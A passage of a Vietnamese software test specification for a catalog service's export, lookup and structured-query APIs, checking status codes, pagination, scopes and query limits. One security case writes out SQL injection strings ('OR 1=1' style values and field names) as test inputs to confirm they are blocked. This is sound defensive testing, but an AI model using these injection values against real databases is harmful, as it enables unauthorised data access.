  2. Gửi lô vào `/catalogs/GIOI_TINH/versions/draft/items:batch`.
- **Mong đợi** Bước 1 trả `409` `ERR-07-004`. Bước 2 trả `403` `ERR-07-003`.

#### TC-07-130 · Ứng dụng thiếu scope ghi
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-023 · khung §14.2 (scope)
- **Tiền điều kiện / dữ liệu** APP-T68-READ (chỉ `rdm.read`), APP-T68-NOSCOPE.
- **Bước**
  1. Mỗi ứng dụng gửi lô hợp lệ.
  2. APP-T68-WRITE gọi `POST /catalogs` (API quản trị tạo danh mục).
- **Mong đợi** Bước 1 trả 403-PQ (thiếu scope). Bước 2 trả 403-PQ (scope `rdm.write` chỉ cho nhập lô vào bản nháp, không cho thao tác quản trị khác).

### TS-07-11 · Xuất danh mục và lịch sử tác vụ

**Mục tiêu.** Xác nhận xuất một phiên bản ra Excel, CSV, JSON đúng dữ liệu, đúng mã hóa; xuất lớn chạy nền với liên kết tải có hạn 24 giờ; mọi lần xuất được ghi kiểm toán. Thay thế LGC-DMDC-013, 014.

**Phủ.** FR-07-024, 025; UC-07-08; API-07-038…040; UI-07-02, 08; ERR-07-006; EVT-07-08; FR-00-030, 031, 040.

**Tiền điều kiện chung.** CAT-LH v1, v2 PUBLISHED; CAT-BIG 100.000 bản ghi; người gọi U-T68-VW.

#### TC-07-131 · Xuất Excel đồng bộ cho danh mục nhỏ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-024 · API-07-038 · UI-07-02 · LGC-DMDC-013
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Gọi `POST /export-jobs` thân `{"catalogCode":"LOAI_HINH_TC","version":"current","format":"XLSX"}` không có `Prefer: respond-async`.
  2. Trên UI-07-02, chọn "Xuất" → "Excel".
- **Mong đợi** `200` trả trực tiếp tệp xlsx; cấu trúc giống tệp mẫu (để nhập lại được), dữ liệu từ dòng 3, đủ 39 (hoặc số hiện hành) bản ghi, cột theo `sortOrder`. KT: có (EXPORT, số dòng, định dạng). EVT: không (xuất đồng bộ không phát EVT-07-08 theo giả định; xem Q07-83).

#### TC-07-132 · Xuất CSV UTF-8 có BOM và JSON
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-024 · LGC-DMDC-014 · FR-00-030
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Xuất `format = CSV`.
  2. Xuất `format = JSON`.
  3. Nhập lại tệp CSV vừa xuất vào một bản nháp bằng UPSERT.
- **Mong đợi** CSV bắt đầu BOM, mở đúng tiếng Việt trên Excel; JSON là mảng đối tượng theo lược đồ API-07-048. Bước 3: mọi dòng `UNCHANGED` (khứ hồi xuất, nhập không mất dữ liệu).

#### TC-07-133 · Xuất lớn chạy nền
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-024 · API-07-038, 039 · EVT-07-08 · FR-00-031
- **Tiền điều kiện / dữ liệu** CAT-BIG.
- **Bước**
  1. Gọi `POST /export-jobs` với `format = XLSX`.
  2. Thăm dò `GET /export-jobs/{jobId}`.
  3. Tải tệp qua `downloadUrl`.
- **Mong đợi** Bước 1 trả `202` (vượt 10.000 dòng tự chuyển nền dù không có `Prefer`). Tác vụ xong trong ≤ 60 giây (NFR-07-006), `downloadUrl` là URL ký sẵn có `expiresAt` = thời điểm xong + 24 giờ. Tệp đủ 100.000 dòng. EVT-07-08 phát một lần. Có thông báo trong ứng dụng cho người tạo.

#### TC-07-134 · Liên kết tải và báo cáo lỗi hết hạn
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-024, 025 · API-07-035, 039, 040 · ERR-07-020 · FR-00-031
- **Tiền điều kiện / dữ liệu** Tác vụ xuất TC-07-133; tác vụ nhập F-ERR ở trạng thái `VALIDATED` tạo 8 ngày trước (đồng hồ giả lập).
- **Bước**
  1. Sau 24 giờ 1 phút (đồng hồ giả lập; URL ký với thời hạn rút ngắn ở CI), tải `downloadUrl`.
  2. Gọi `GET /export-jobs/{jobId}`.
  3. Gọi `GET /import-jobs/{jobId}/rows?valid=false` của tác vụ nhập 8 ngày tuổi.
  4. Gọi `GET /import-jobs?createdBy={người khác}` bằng U-T68-DS-NV.
- **Mong đợi** Bước 1 bị kho đối tượng từ chối (`403`). Bước 2 cho trạng thái `EXPIRED`, không còn `downloadUrl`; người dùng phải xuất lại. Bước 3 trả `409` `ERR-07-020` "Báo cáo không còn" vì dòng đã bị dọn sau 7 ngày; tác vụ vẫn hiện trong lịch sử. Bước 4 không lộ tác vụ của người khác: tham số `createdBy` chỉ có tác dụng với vai trò xem mọi tác vụ, nên kết quả chỉ gồm tác vụ do U-T68-DS-NV tạo.

#### TC-07-135 · Xuất phiên bản không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-024 · ERR-07-006
- **Tiền điều kiện / dữ liệu** CAT-LH không có v9.
- **Bước**
  1. Gọi `POST /export-jobs` với `version` = 9.
- **Mong đợi** `404` `ERR-07-006`.

#### TC-07-136 · Xuất phiên bản lịch sử, không xuất thuộc tính ẩn
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-024 · FR-07-006
- **Tiền điều kiện / dữ liệu** v2 có thuộc tính `website` HIDDEN (TC-07-028).
- **Bước**
  1. Xuất v1 và v2 dạng CSV.
- **Mong đợi** Tệp v1 có cột `website`, đúng dữ liệu v1. Tệp v2 không có cột `website`.

#### TC-07-137 · Kiểm toán xuất và ứng dụng thiếu scope
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-024, 050 · FR-00-040 · NFR-07-015
- **Tiền điều kiện / dữ liệu** U-T68-VW, APP-T68-NOSCOPE.
- **Bước**
  1. U-T68-VW xuất CAT-LH; đọc `GET /catalogs/LOAI_HINH_TC/history`.
  2. APP-T68-NOSCOPE gọi `POST /export-jobs`.
- **Mong đợi** Bước 1: lịch sử có mục EXPORT với người, thời điểm, định dạng, phiên bản. Bước 2 trả 403-PQ.

> **Câu hỏi mở Q07-83:** EVT-07-08 có phát cho xuất đồng bộ (≤ 10.000 dòng) hay chỉ cho tác vụ nền? TC-07-131 giả định chỉ tác vụ nền.

### TS-07-12 · Tra cứu khai thác qua API

**Mục tiêu.** Xác nhận các API khai thác mà HTTT dùng hằng ngày: tra một mã, tra lô, lấy toàn bộ theo con trỏ với ETag, lấy cây, tìm không dấu, lấy thay đổi (delta), lấy lược đồ và ảnh chụp. Đây là nhóm có lưu lượng lớn nhất và là nơi thay thế LGC-DMDC-015; kết quả phải đúng theo thời điểm (BR-07-008) và đúng trạng thái ngừng dùng (BR-07-004).

**Phủ.** FR-07-026…031, 033; BR-07-004, 008; UC-07-09; API-07-041…046, 048, 049; ERR-07-001, 006, 007, 026.

**Tiền điều kiện chung.** CAT-LH v1 (hiệu lực từ 2025-01-01 tới 2026-12-01) và v2 (từ 2026-12-01); `DVHC` giả lập v1…v3; đồng hồ 2026-11-21; người gọi APP-T68-READ (scope `rdm.read`) trừ khi ghi khác.

#### TC-07-138 · Tra một mã tại thời điểm hiện tại
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-026 · API-07-042 · UC-07-09 · LGC-DMDC-015 · AT-07-001 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/items/KH01.L01.P01`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/items/kh01.l01.p01`.
- **Mong đợi** Cả hai `200`, cùng dữ liệu: `code`, `name`, `parentCode`, `path`, `depth`, `levelName`, `status`, `attrs` (không có thuộc tính HIDDEN), `versionNo` = 1, `validFrom`, `validTo`. Có header `ETag` và `Cache-Control: max-age` ngắn. KT: không (thao tác đọc khai thác chỉ ghi chỉ số `rdm_lookup_total`).

#### TC-07-139 · Tra mã không tồn tại
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-026 · ERR-07-007
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/items/KHONG_CO`.
  2. Gọi `GET /catalogs/KHONG_CO/items/A`.
- **Mong đợi** Bước 1 trả `404` `ERR-07-007`. Bước 2 trả `404` `ERR-07-001`. Chỉ số `rdm_lookup_total{result="not_found"}` tăng.

#### TC-07-140 · Tra mã theo thời điểm quá khứ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-026 · BR-07-008 · AT-07-002 (SRS cũ)
- **Tiền điều kiện / dữ liệu** `DVHC` giả lập.
- **Bước**
  1. Gọi `GET /catalogs/DVHC/items/99001?at=2024-06-01`.
  2. Gọi `GET /catalogs/DVHC/items/971?at=2024-06-01`.
  3. Gọi `GET /catalogs/DVHC/items/971?at=2025-07-01`.
- **Mong đợi** Bước 1 trả bản ghi xã `99001` thuộc huyện `971`, `versionNo` = 1. Bước 2 trả huyện `971` cấp "Huyện". Bước 3 trả `200` với `status = DEPRECATED` và `replacedBy` theo sự kiện ABOLISH (hoặc `404` `ERR-07-007` nếu SDD quy ước đơn vị giải thể không còn trong phiên bản mới; ca kiểm thử bám quy ước của SDD, mặc định là trả DEPRECATED theo BR-07-004).

#### TC-07-141 · Tra mã đã ngừng dùng trả trạng thái và mã thay thế
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-026, 019 · BR-07-004 · AT-07-003 (SRS cũ)
- **Tiền điều kiện / dữ liệu** `DVHC` v2 hiện hành với `99001` DEPRECATED `replacedBy = ["99101"]`; đồng hồ 2025-08-01.
- **Bước**
  1. Gọi `GET /catalogs/DVHC/items/99001`.
- **Mong đợi** `200`, `status = DEPRECATED`, `replacedBy = ["99101"]`, header cảnh báo `Deprecation` hoặc trường `warning` theo D03-04.

#### TC-07-142 · Thời điểm tra không hợp lệ hoặc trước mọi phiên bản
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-026 · BR-07-008 · ERR-07-007
- **Tiền điều kiện / dữ liệu** CAT-LH v1 hiệu lực từ 2025-01-01.
- **Bước**
  1. Gọi `?at=2026-13-01`.
  2. Gọi `?at=21/11/2026`.
  3. Gọi `?at=2024-12-31`.
  4. Gọi `?at=2025-01-01` (biên dưới, khoảng đóng bên trái).
- **Mong đợi** Bước 1, 2 trả `400`. Bước 3 trả `404` `ERR-07-007`. Bước 4 trả `200`.

#### TC-07-143 · Tra lô 500 mã
- **Loại** Dương, Biên · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-027 · API-07-043 · AT-07-020 (SRS cũ)
- **Tiền điều kiện / dữ liệu** 500 mã của `DVHC` chính thức, trong đó 3 mã không tồn tại, 2 mã lặp, 1 mã chữ thường.
- **Bước**
  1. Gọi `POST /catalogs/DVHC/items:lookup` thân `{"codes":[...500 mã...],"at":"2026-11-21"}`.
- **Mong đợi** `200`; kết quả giữ đúng thứ tự đầu vào; mã không tồn tại có `found = false` (không làm hỏng cả lô); mã lặp trả hai lần; mã chữ thường khớp.

#### TC-07-144 · Tra lô vượt 500 mã
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-027 · ERR-07-026
- **Tiền điều kiện / dữ liệu** Danh sách 501 mã; danh sách rỗng.
- **Bước**
  1. Gửi 501 mã.
  2. Gửi `codes` rỗng.
- **Mong đợi** Bước 1 trả `400` `ERR-07-026`. Bước 2 trả `400` lỗi kiểm tra hợp lệ.

#### TC-07-145 · Lấy toàn bộ bản ghi theo con trỏ và chọn trường
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-028 · API-07-041
- **Tiền điều kiện / dữ liệu** CAT-BIG 100.000 bản ghi.
- **Bước**
  1. Gọi `GET /catalogs/DM_LON_100K/items?limit=1000&fields=code,name,attrs.a1`.
  2. Lặp theo `nextCursor` tới hết.
  3. Giữa chừng (sau trang 50), phát hành phiên bản mới của CAT-BIG.
- **Mong đợi** Mỗi trang ≤ 1.000 bản ghi, chỉ gồm trường yêu cầu. Tổng 100.000 bản ghi, không trùng, không sót, thứ tự ổn định theo `sortOrder, code`. Con trỏ mã hóa `versionId`, nên sau bước 3 các trang còn lại vẫn thuộc phiên bản cũ (ảnh chụp nhất quán).

#### TC-07-146 · ETag và If-None-Match
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-028 · API-07-041, 042 · AT-07-022 (SRS cũ)
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/items?limit=1000`, ghi `ETag`.
  2. Gọi lại với `If-None-Match` = ETag.
  3. Phát hành phiên bản mới có hiệu lực hôm nay rồi gọi lại bước 2.
- **Mong đợi** Bước 2 trả `304` không thân. Bước 3 trả `200` với ETag mới.

#### TC-07-147 · Tham số khai thác không hợp lệ
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-028 · API-07-041
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Gọi `?limit=1000` và `?limit=1001`.
  2. Gọi `?cursor=` là chuỗi giả mạo, và con trỏ hợp lệ của danh mục khác.
  3. Gọi `?fields=code,khong_co`.
- **Mong đợi** `limit=1000` trả `200`; `limit=1001` trả `400`. Con trỏ giả mạo hoặc của danh mục khác trả `400` (con trỏ được ký, không giải mã được nội dung). `fields` có trường không tồn tại trả `400`.

#### TC-07-148 · Bao gồm hoặc loại bản ghi ngừng dùng
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-028 · BR-07-004
- **Tiền điều kiện / dữ liệu** `DVHC` v2 có 3 xã DEPRECATED.
- **Bước**
  1. Gọi `GET /catalogs/DVHC/items?at=2025-08-01`.
  2. Gọi thêm `&includeDeprecated=true`.
- **Mong đợi** Bước 1 không có bản ghi DEPRECATED. Bước 2 có thêm 3 bản ghi, kèm `replacedBy`.

#### TC-07-149 · Lấy cây và nhánh con
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-029 · API-07-044 · LGC-DMDC-002
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/tree`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/tree?root=KH01&depth=1`.
  3. Gọi `GET /catalogs/DVHC/tree?root=97&at=2024-06-01`.
- **Mong đợi** Bước 1 trả cây đủ 3 khối, lồng `children`, sắp theo `sortOrder`. Bước 2 trả `KH01` và đúng các con trực tiếp, con có cờ `hasChildren`. Bước 3 trả cây 3 cấp lịch sử (tỉnh, huyện, xã).

#### TC-07-150 · Cây trên danh mục không phân cấp hoặc gốc không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-029, 018 · ERR-07-007
- **Tiền điều kiện / dữ liệu** CAT-MUC phẳng.
- **Bước**
  1. Gọi `GET /catalogs/MUC_DO_DVC/tree`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/tree?root=KHONG_CO`.
  3. Gọi `?depth=11`.
- **Mong đợi** Bước 1 trả `200` với danh sách phẳng (mọi nút cấp 1) hoặc `400` theo D03-04; không lỗi `500`. Bước 2 trả `404` `ERR-07-007`. Bước 3 trả `400`.

#### TC-07-151 · Tìm kiếm không dấu
- **Loại** Dương, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-030 · API-07-045 · FR-00-020 · AT-07-019 (SRS cũ)
- **Tiền điều kiện / dữ liệu** `DVHC` chính thức.
- **Bước**
  1. Gọi `GET /catalogs/DVHC/items:search?q=ha noi`.
  2. Gọi `?q=HÀ NỘI`, `?q=đa`, `?q=` rỗng.
  3. Gọi `?q=a&limit=51`.
- **Mong đợi** Bước 1 trả "Thành phố Hà Nội" ở đầu (xếp hạng theo độ khớp). Bước 2: hai truy vấn đầu cho cùng kết quả; `q=đa` khớp cả "Đà" và "Đa"; `q` rỗng trả `400`. Bước 3 trả `400`.

#### TC-07-152 · Lấy thay đổi kể từ một phiên bản
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-031 · API-07-046
- **Tiền điều kiện / dữ liệu** `DVHC` giả lập v1…v3.
- **Bước**
  1. Gọi `GET /catalogs/DVHC/changes?sinceVersion=1`.
  2. Gọi `?sinceVersion=3` (bằng phiên bản hiện hành).
- **Mong đợi** Bước 1 trả `toVersion` = 3 và danh sách thay đổi gộp (mỗi mã một mục trạng thái cuối) có `changeType`, kèm `successions` liên quan. Bước 2 trả danh sách rỗng, `toVersion` = 3.

#### TC-07-153 · Delta với phiên bản không hợp lệ
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-031 · ERR-07-006
- **Tiền điều kiện / dữ liệu** `DVHC` có v1…v3.
- **Bước**
  1. Gọi `?sinceVersion=9`.
  2. Gọi không có `sinceVersion`.
- **Mong đợi** Bước 1 trả `404` `ERR-07-006`. Bước 2 trả `400`.

#### TC-07-154 · Liệt kê danh mục và lấy lược đồ qua API
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-033 · API-07-001, 048
- **Tiền điều kiện / dữ liệu** APP-T68-READ.
- **Bước**
  1. Gọi `GET /catalogs?status=ACTIVE`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/schema`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/schema?version=1`.
- **Mong đợi** Bước 1 trả danh mục ACTIVE mà HTTT được phép thấy (không có `TRAM_QUAN_TRAC` RESTRICTED vì `HT-HOTICH` chưa được cấp quyền, xem TS-07-23). Bước 2 trả metadata (mã, tên, phân cấp, tên cấp, thuộc tính, `queryable`) và JSON Schema của phiên bản hiệu lực. Bước 3 trả lược đồ v1.

#### TC-07-155 · Lược đồ của phiên bản hoặc danh mục không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-033 · ERR-07-006, ERR-07-001
- **Tiền điều kiện / dữ liệu** —
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/schema?version=9`.
  2. Gọi `GET /catalogs/KHONG_CO/schema`.
  3. APP-T68-READ gọi `GET /catalogs/LOAI_HINH_TC/schema?version=draft`.
- **Mong đợi** Bước 1 `404` `ERR-07-006`. Bước 2 `404` `ERR-07-001`. Bước 3 `404` `ERR-07-006` (bản nháp không lộ ra API khai thác).

#### TC-07-156 · Tải ảnh chụp phiên bản
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-028 · API-07-049 · ADR-053
- **Tiền điều kiện / dữ liệu** CAT-LH v1 có ảnh chụp.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/snapshots/1?format=json`, không theo chuyển hướng.
  2. Theo `Location`, tải và giải nén.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/snapshots/draft`.
- **Mong đợi** Bước 1 trả `302` tới URL ký sẵn hạn ngắn của bucket `dh-t68-rdm`. Bước 2 cho tệp có SHA-256 khớp metadata và nội dung khớp `GET .../items` của v1. Bước 3 trả `404` `ERR-07-006`.


### TS-07-13 · Truy vấn có cấu trúc (DSL)

**Mục tiêu.** Kịch bản này xác nhận API truy vấn có cấu trúc thay được nhu cầu "truy vấn CSDL tùy chọn" của Aita (LGC-DMDC-016) mà không mở đường cho truy vấn tùy ý: chỉ lọc, sắp xếp trên trường hệ thống và thuộc tính `queryable`, mọi giá trị là tham số ràng buộc, có giới hạn độ phức tạp và thời gian.

**Phủ.** FR-07-032; BR-07-018; API-07-047; UI-07-12; ERR-07-023, 024, 025, 030.

**Tiền điều kiện chung.** CAT-LH v1 đã phát hành (39 bản ghi); CAT-BIG đã phát hành; CAT-RES cấp quyền khai thác cho `HT-DATDAI`. Người gọi mặc định APP-T68-QUERY. Đường dẫn rút gọn `POST /catalogs/{c}/items:query`.

#### TC-07-157 · Lọc theo thuộc tính queryable, chọn trường và sắp xếp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-032 · BR-07-018 · API-07-047 · LGC-DMDC-016
- **Tiền điều kiện / dữ liệu** CAT-LH v1; 9 bản ghi cấp 2 có `cap_quan_ly = TINH`.
- **Bước**
  1. Gọi với `filter = {"and":[{"field":"attrs.cap_quan_ly","op":"eq","value":"TINH"},{"field":"depth","op":"eq","value":2}]}`, `select = ["code","name","attrs.viet_tat"]`, `sort = [{"field":"attrs.viet_tat","dir":"asc"}]`.
  2. Gọi lại với `select` chứa `attrs.so_bien_che` (thuộc tính không `queryable`).
- **Mong đợi** Bước 1 trả `200`, `items` có đúng các bản ghi thỏa hai điều kiện, mỗi phần tử chỉ có ba trường đã chọn, thứ tự theo `viet_tat` rồi `code`; `catalogVersion` = 1; có `took`. Bước 2 trả `200` (thuộc tính không `queryable` vẫn được chọn, chỉ không được lọc hoặc sắp xếp). KT: không. EVT: không.

#### TC-07-158 · Nhóm `and`, `or`, `not` lồng nhau và toán tử tập hợp
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** UT, API
- **Truy vết** FR-07-032 · API-07-047
- **Tiền điều kiện / dữ liệu** CAT-LH v1.
- **Bước**
  1. Gọi với `{"or":[{"field":"code","op":"startsWith","value":"KH01"},{"not":{"field":"attrs.cap_quan_ly","op":"in","value":["XA"]}}]}`.
  2. Gọi với `{"field":"attrs.viet_tat","op":"isNull"}`.
  3. Gọi với `{"field":"name","op":"contains","value":"giao duc"}`.
- **Mong đợi** Kết quả từng bước khớp với kết quả tính bằng truy vấn SQL tham chiếu viết tay trên cùng dữ liệu (so tập mã). Bước 3 khớp tên có dấu "Giáo dục" (không dấu, không phân biệt hoa thường). Kiểm thử đơn vị của bộ dịch xác nhận câu SQL sinh ra chỉ có tham số `$n`, không có giá trị nối chuỗi.

#### TC-07-159 · Truy vấn tại thời điểm và theo phiên bản
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-032 · FR-07-026 · API-07-047
- **Tiền điều kiện / dữ liệu** CAT-GT v1 (2020-01-01…2025-01-01), v2 (từ 2025-01-01). Người gọi APP-T68-QUERY (CAT-GT là COMMON, mọi tenant đọc được).
- **Bước**
  1. Gọi `/catalogs/GIOI_TINH/items:query` với `at = 2024-06-01`.
  2. Gọi với `version = 2`.
  3. Gọi với cả `at` và `version`.
- **Mong đợi** Bước 1 trả `catalogVersion` = 1. Bước 2 trả `catalogVersion` = 2. Bước 3 trả `400` `ERR-07-023` (hai tham số loại trừ nhau).

#### TC-07-160 · Phân trang bằng con trỏ ổn định
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-032 · API-07-047 · NFR-07-004
- **Tiền điều kiện / dữ liệu** CAT-BIG (100.000 bản ghi).
- **Bước**
  1. Gọi với `limit = 1000`, `sort = [{"field":"sortOrder","dir":"asc"}]`, lặp theo `nextCursor` tới khi rỗng.
  2. Trong lúc lặp, một luồng khác tạo và phát hành phiên bản mới của CAT-BIG.
- **Mong đợi** Tổng số mã thu được bằng 100.000, không trùng, không sót; mọi trang có cùng `catalogVersion` (con trỏ gắn với phiên bản của trang đầu). Trang cuối có `nextCursor = null`.

#### TC-07-161 · Con trỏ bị sửa hoặc dùng với bộ lọc khác
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-032 · ERR-07-023
- **Tiền điều kiện / dữ liệu** Một `nextCursor` hợp lệ lấy từ TC-07-160.
- **Bước**
  1. Đổi một ký tự trong con trỏ rồi gọi.
  2. Dùng con trỏ hợp lệ nhưng thay `filter`.
  3. Dùng con trỏ của tenant T68 khi gọi bằng APP-T01-READ.
- **Mong đợi** Bước 1, 2 trả `400` `ERR-07-023` (chữ ký HMAC sai, băm `filter` không khớp). Bước 3 trả `400` hoặc `404-ẩn`, không trả dữ liệu của T68.

#### TC-07-162 · Lọc trên thuộc tính không queryable
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-032 · BR-07-018 · ERR-07-025
- **Tiền điều kiện / dữ liệu** CAT-LH: `so_bien_che` không `queryable`.
- **Bước**
  1. Gọi với `{"field":"attrs.so_bien_che","op":"gt","value":10}`.
  2. Gọi với `sort = [{"field":"attrs.so_bien_che","dir":"desc"}]`.
  3. Gọi với `{"field":"attrs.khong_ton_tai","op":"eq","value":"x"}`.
- **Mong đợi** Cả ba trả `400` `ERR-07-025`, thân lỗi nêu tên trường và danh sách trường `queryable` hợp lệ (`viet_tat`, `cap_quan_ly`). Chỉ số `rdm_query_rejected_total{reason="NOT_QUERYABLE"}` tăng 3.

#### TC-07-163 · Biểu thức sai cú pháp và sai kiểu giá trị
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** UT, API
- **Truy vết** FR-07-032 · ERR-07-023
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Gửi `filter` có khóa lạ `{"field":"code","op":"regex","value":".*"}`.
  2. Gửi `{"field":"attrs.ngay_thanh_lap","op":"gte","value":"31/02/2024"}` (không phải ngày ISO).
  3. Gửi `between` với 3 phần tử.
  4. Gửi `contains` với chuỗi 1 ký tự.
  5. Gửi thân không phải JSON.
- **Mong đợi** Bước 1…4 trả `400` `ERR-07-023`, trường `errors[].pointer` chỉ đúng vị trí bằng JSON Pointer (ví dụ `/filter/op`). Bước 5 trả `400` `ERR-07-023`. Không có thông điệp SQL hay ngăn xếp lỗi Java trong phản hồi.

#### TC-07-164 · Vượt giới hạn độ phức tạp
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-032 · ERR-07-024
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Gửi 20 điều kiện lá (biên), rồi 21 điều kiện.
  2. Gửi nhóm lồng 3 cấp (biên), rồi 4 cấp.
  3. Gửi `in` 500 phần tử, rồi 501.
  4. Gửi `limit = 1000`, rồi `1001`.
- **Mong đợi** Các lần ở biên trả `200`. Các lần vượt trả `422` `ERR-07-024` với `reason` lần lượt `TOO_MANY_CONDITIONS`, `TOO_DEEP`, `IN_TOO_LARGE`, `LIMIT_TOO_LARGE`.

#### TC-07-165 · Truy vấn quá thời gian bị cắt
- **Loại** Âm, Khả dụng · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-032 · ERR-07-024 · NFR-07-004
- **Tiền điều kiện / dữ liệu** CAT-BIG; IT tiêm độ trễ bằng `pg_sleep` qua hàm `unaccent_lower` thay thế trong schema thử.
- **Bước**
  1. Gửi truy vấn `contains` trên `name` khiến câu SQL chạy quá 2 giây.
  2. Ngay sau đó gửi một truy vấn đơn giản.
- **Mong đợi** Bước 1 trả `422` `ERR-07-024` `reason = TIMEOUT` sau khoảng 2 giây, kết nối được trả về pool (đếm `hikaricp_connections_active` trở lại mức trước). Bước 2 trả `200` bình thường. Giao dịch của bước 1 là chỉ đọc (kiểm tra `SHOW transaction_read_only`).

#### TC-07-166 · Chống chèn SQL qua giá trị và tên trường
- **Loại** Bảo mật, Âm · **Ưu tiên** P1 · **Tự động** API, ZAP
- **Truy vết** FR-07-032 · BR-07-018 · ASVS V5.3
- **Tiền điều kiện / dữ liệu** CAT-LH.
- **Bước**
  1. Gửi `{"field":"code","op":"eq","value":"x' OR '1'='1"}`.
  2. Gửi `{"field":"attrs.viet_tat') OR 1=1 --","op":"eq","value":"x"}`.
  3. Gửi `{"field":"name","op":"contains","value":"%_%"}`.
- **Mong đợi** Bước 1 trả `200` với `items` rỗng. Bước 2 trả `400` `ERR-07-025` (tên trường không thuộc danh sách cho phép). Bước 3 trả các bản ghi có tên chứa đúng chuỗi "%_%" (ký tự đại diện đã được thoát), tức rỗng với dữ liệu mẫu. Nhật ký PostgreSQL không có câu lệnh chứa giá trị nối chuỗi.

#### TC-07-167 · Danh mục HYBRID trả hợp của gốc và phần bổ sung
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-032 · FR-07-048 · API-07-047
- **Tiền điều kiện / dữ liệu** CAT-DT68 (HYBRID trên `DAN_TOC`, 2 bản ghi bổ sung).
- **Bước**
  1. Gọi `/catalogs/DAN_TOC_T68/items:query` với `filter = {"field":"code","op":"startsWith","value":"68"}`.
  2. Gọi không có `filter`, `limit = 100`.
- **Mong đợi** Bước 1 trả đúng `68.01`, `68.02`. Bước 2 trả 57 bản ghi (55 gốc cộng 2 bổ sung), mỗi phần tử có cờ `isLocalExtension` đúng.

#### TC-07-168 · Scope và danh mục hạn chế
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-032 · FR-07-052 · ERR-07-030
- **Tiền điều kiện / dữ liệu** CAT-RES cấp cho `HT-DATDAI` (APP-T68-QUERY), không cấp cho `HT-HOTICH` (APP-T68-READ).
- **Bước**
  1. APP-T68-READ (không có `rdm.query`) gọi truy vấn trên CAT-LH.
  2. APP-T68-QUERY gọi truy vấn trên CAT-RES.
  3. Một client có `rdm.query` nhưng thuộc HTTT `HT-KHAC` gọi truy vấn trên CAT-RES.
- **Mong đợi** Bước 1 trả `403-PQ`. Bước 2 trả `200`. Bước 3 trả `403` `ERR-07-030`.

#### TC-07-169 · Trình thử API trên giao diện
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** E2E
- **Truy vết** FR-07-032 · UI-07-12 · LGC-DMDC-016
- **Tiền điều kiện / dữ liệu** U-T68-DEV đăng nhập.
